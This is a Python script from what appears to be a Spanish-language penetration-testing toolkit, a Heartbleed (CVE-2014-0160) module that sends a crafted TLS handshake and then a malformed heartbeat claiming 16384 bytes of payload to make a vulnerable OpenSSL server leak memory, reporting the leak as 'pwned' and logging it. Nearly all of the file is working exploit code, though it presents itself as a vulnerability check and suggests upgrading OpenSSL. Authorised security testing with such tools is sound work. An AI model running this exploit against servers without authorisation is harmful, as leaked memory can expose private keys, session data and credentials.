# scripts/ssl/attack/heartbleed.py
# CVE-2014-0160
import socket, struct
from scripts.base import BaseScript
from core.output import print_result, print_check, console
from core import session_db

class Script(BaseScript):
    name        = "heartbleed"
    protocol    = "ssl"
    category    = "attack"
    description = "CVE-2014-0160: detecta si el servidor es vulnerable a Heartbleed (lectura de memoria en OpenSSL 1.0.1-1.0.1f)."

    EXAMPLES = [
        {"flag": "-t / --port", "desc": "IP y puerto SSL",
         "good": "ssl --script=heartbleed -t 10.10.10.5 --port 443",
         "bad":  "ssl --script=heartbleed (sin -t)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 443)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        ip      = self.target.ip

        print_result("SSL", ip, "info",
                     f"Heartbleed (CVE-2014-0160): probando {ip}:{port}")

        try:
            sock = socket.create_connection((ip, port), timeout=timeout)
        except Exception as e:
            print_result("SSL", ip, "fail", f"no se pudo conectar: {e}")
            return False

        try:
            hello_payload = bytes([
                0x03,0x02,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,
                0x00,0x02, 0x00,0x2f,
                0x01,0x00,
                0x00,0x05, 0x00,0x0f, 0x00,0x01, 0x01,
            ])
            hello  = bytes([0x01]) + struct.pack(">I", len(hello_payload))[1:] + hello_payload
            record = bytes([0x16,0x03,0x01]) + struct.pack(">H", len(hello)) + hello
            sock.send(record)

            sock.settimeout(3)
            data = b""
            try:
                while len(data) < 1024:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    data += chunk
            except socket.timeout:
                pass

            if not data:
                print_result("SSL", ip, "info", "Sin respuesta — posiblemente no vulnerable")
                sock.close()
                return False

            # Heartbeat malicioso: payload=1 byte, length=0x4000 (16384)
            hb = bytes([0x18, 0x03,0x02, 0x00,0x03, 0x01, 0x40,0x00])
            sock.send(hb)

            resp = b""
            sock.settimeout(5)
            try:
                while len(resp) < 200:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    resp += chunk
            except socket.timeout:
                pass

            sock.close()

            if resp and resp[0:1] == b"\x18":
                print_result("SSL", ip, "pwned",
                             f"VULNERABLE a CVE-2014-0160 (Heartbleed) — "
                             f"{len(resp)} bytes de memoria filtrados")
                print_result("SSL", ip, "info",
                             "Actualizar OpenSSL a >= 1.0.1g / 1.0.2+")
                session_db.save_finding(ip, "SSL", "heartbleed_cve_2014_0160",
                                        f"leaked={len(resp)} bytes port={port}")
                return True
            else:
                print_check("No vulnerable a CVE-2014-0160 (Heartbleed)", ok=True)
                return False

        except Exception as e:
            print_result("SSL", ip, "fail", f"error: {e}")
            try: sock.close()
            except Exception: pass
            return False
